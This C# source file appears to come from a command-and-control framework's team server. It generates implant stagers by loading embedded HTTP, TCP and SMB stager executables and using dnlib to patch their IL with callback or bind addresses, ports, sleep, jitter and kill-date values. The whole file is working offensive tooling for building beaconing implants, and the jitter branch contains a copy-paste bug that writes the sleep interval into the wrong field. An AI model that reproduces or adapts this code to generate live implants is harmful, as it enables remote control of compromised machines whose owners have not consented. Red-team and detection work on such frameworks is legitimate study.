using dnlib.DotNet;
using dnlib.DotNet.Emit;

using Shared.Models;

using System;
using System.IO;
using System.Linq;

namespace TeamServer.Models
{
    public class Payload
    {
        readonly Listener Listener;

        public Payload(Listener Listener)
        {
            this.Listener = Listener;
        }

        public byte[] GenerateStager()
        {
            byte[] finalStager = null;

            switch (Listener.Type)
            {
                case Listener.ListenerType.HTTP:
                    finalStager = GenerateHTTPStager();
                    break;

                case Listener.ListenerType.TCP:
                    finalStager = GenerateTCPStager();
                    break;

                case Listener.ListenerType.SMB:
                    finalStager = GenerateSMBStager();
                    break;

                default:
                    break;
            }

            return finalStager;
        }

        byte[] GenerateHTTPStager()
        {
            var listener = Listener as ListenerHTTP;

            var raw = Helpers.GetEmbeddedResource("stager_http.exe");
            var md = ModuleDefMD.Load(raw);

            var stager = md.Types.FirstOrDefault(t => t.FullName.Equals("Stager.Stager", StringComparison.OrdinalIgnoreCase));

            var connectAddress = stager.Methods.FirstOrDefault(m => m.FullName.Equals("System.String Stager.Stager::get_ConnectAddress()", StringComparison.OrdinalIgnoreCase));
            connectAddress.Body.Instructions[1].Operand = listener.ConnectAddress;

            var connectPort = stager.Methods.FirstOrDefault(m => m.FullName.Equals("System.Int32 Stager.Stager::get_ConnectPort()", StringComparison.OrdinalIgnoreCase));
            connectPort.Body.Instructions[1].Operand = listener.ConnectPort;

            var sleepInterval = stager.Methods.FirstOrDefault(m => m.FullName.Equals("System.Int32 Stager.Stager::get_SleepInterval()", StringComparison.OrdinalIgnoreCase));

            if (listener.SleepInterval == 0)
            {
                sleepInterval.Body.Instructions[1].OpCode = OpCodes.Ldc_I4_0;
                sleepInterval.Body.Instructions[1].Operand = null;
            }
            else if (listener.SleepInterval == 1)
            {
                sleepInterval.Body.Instructions[1].OpCode = OpCodes.Ldc_I4_1;
                sleepInterval.Body.Instructions[1].Operand = null;
            }
            else if (listener.SleepInterval == 2)
            {
                sleepInterval.Body.Instructions[1].OpCode = OpCodes.Ldc_I4_2;
                sleepInterval.Body.Instructions[1].Operand = null;
            }
            else if (listener.SleepInterval == 3)
            {
                sleepInterval.Body.Instructions[1].OpCode = OpCodes.Ldc_I4_3;
                sleepInterval.Body.Instructions[1].Operand = null;
            }
            else if (listener.SleepInterval == 4)
            {
                sleepInterval.Body.Instructions[1].OpCode = OpCodes.Ldc_I4_4;
                sleepInterval.Body.Instructions[1].Operand = null;
            }
            else if (listener.SleepInterval == 5)
            {
                sleepInterval.Body.Instructions[1].OpCode = OpCodes.Ldc_I4_5;
                sleepInterval.Body.Instructions[1].Operand = null;
            }
            else if (listener.SleepInterval == 6)
            {
                sleepInterval.Body.Instructions[1].OpCode = OpCodes.Ldc_I4_6;
                sleepInterval.Body.Instructions[1].Operand = null;
            }
            else if (listener.SleepInterval == 7)
            {
                sleepInterval.Body.Instructions[1].OpCode = OpCodes.Ldc_I4_7;
                sleepInterval.Body.Instructions[1].Operand = null;
            }
            else if (listener.SleepInterval == 8)
            {
                sleepInterval.Body.Instructions[1].OpCode = OpCodes.Ldc_I4_8;
                sleepInterval.Body.Instructions[1].Operand = null;
            }
            else
            {
                sleepInterval.Body.Instructions[1].Operand = listener.SleepInterval;
            }

            var sleepJitter = stager.Methods.FirstOrDefault(m => m.FullName.Equals("System.Int32 Stager.Stager::get_SleepJitter()", StringComparison.OrdinalIgnoreCase));

            if (listener.SleepJitter == 0)
            {
                sleepJitter.Body.Instructions[1].OpCode = OpCodes.Ldc_I4_0;
                sleepJitter.Body.Instructions[1].Operand = null;
            }
            else if (listener.SleepJitter == 1)
            {
                sleepJitter.Body.Instructions[1].OpCode = OpCodes.Ldc_I4_1;
                sleepJitter.Body.Instructions[1].Operand = null;
            }
            else if (listener.SleepJitter == 2)
            {
                sleepJitter.Body.Instructions[1].OpCode = OpCodes.Ldc_I4_2;
                sleepJitter.Body.Instructions[1].Operand = null;
            }
            else if (listener.SleepJitter == 3)
            {
                sleepJitter.Body.Instructions[1].OpCode = OpCodes.Ldc_I4_3;
                sleepJitter.Body.Instructions[1].Operand = null;
            }
            else if (listener.SleepJitter == 4)
            {
                sleepJitter.Body.Instructions[1].OpCode = OpCodes.Ldc_I4_4;
                sleepJitter.Body.Instructions[1].Operand = null;
            }
            else if (listener.SleepJitter == 5)
            {
                sleepJitter.Body.Instructions[1].OpCode = OpCodes.Ldc_I4_5;
                sleepJitter.Body.Instructions[1].Operand = null;
            }
            else if (listener.SleepJitter == 6)
            {
                sleepJitter.Body.Instructions[1].OpCode = OpCodes.Ldc_I4_6;
                sleepJitter.Body.Instructions[1].Operand = null;
            }
            else if (listener.SleepJitter == 7)
            {
                sleepJitter.Body.Instructions[1].OpCode = OpCodes.Ldc_I4_7;
                sleepJitter.Body.Instructions[1].Operand = null;
            }
            else if (listener.SleepJitter == 8)
            {
                sleepJitter.Body.Instructions[1].OpCode = OpCodes.Ldc_I4_8;
                sleepJitter.Body.Instructions[1].Operand = null;
            }
            else
            {
                sleepInterval.Body.Instructions[1].Operand = listener.SleepInterval;
            }

            var killDate = stager.Methods.FirstOrDefault(m => m.FullName.Equals("System.DateTime Stager.Stager::get_KillDate()", StringComparison.OrdinalIgnoreCase));
            killDate.Body.Instructions[1].Operand = listener.KillDate.ToString();

            return WriteModule(md);
        }

        byte[] GenerateTCPStager()
        {
            var listener = Listener as ListenerTCP;

            var raw = Helpers.GetEmbeddedResource("stager_tcp.exe");
            var md = ModuleDefMD.Load(raw);

            var stager = md.Types.FirstOrDefault(t => t.FullName.Equals("Stager.Stager", StringComparison.OrdinalIgnoreCase));

            var bindAddress = stager.Methods.FirstOrDefault(m => m.FullName.Equals("System.String Stager.Stager::get_BindAddress()", StringComparison.OrdinalIgnoreCase));
            bindAddress.Body.Instructions[1].Operand = listener.BindAddress;

            var bindPort = stager.Methods.FirstOrDefault(m => m.FullName.Equals("System.Int32 Stager.Stager::get_BindPort()", StringComparison.OrdinalIgnoreCase));
            bindPort.Body.Instructions[1].Operand = listener.BindPort;

            var killDate = stager.Methods.FirstOrDefault(m => m.FullName.Equals("System.DateTime Stager.Stager::get_KillDate()", StringComparison.OrdinalIgnoreCase));
            killDate.Body.Instructions[1].Operand = listener.KillDate.ToString();

            return WriteModule(md);
        }

        byte[] GenerateSMBStager()
        {
            var stager = Helpers.GetEmbeddedResource("stager_smb.exe");
            var md = ModuleDefMD.Load(stager);

            var stagerType = md.Types.FirstOrDefault(t => t.FullName.Equals("Stager.Stager", StringComparison.OrdinalIgnoreCase));

            return WriteModule(md);
        }

        byte[] WriteModule(ModuleDefMD ModuleDef)
        {
            using (var ms = new MemoryStream())
            {
                ModuleDef.Write(ms);
                return ms.ToArray();
            }
        }
    }
}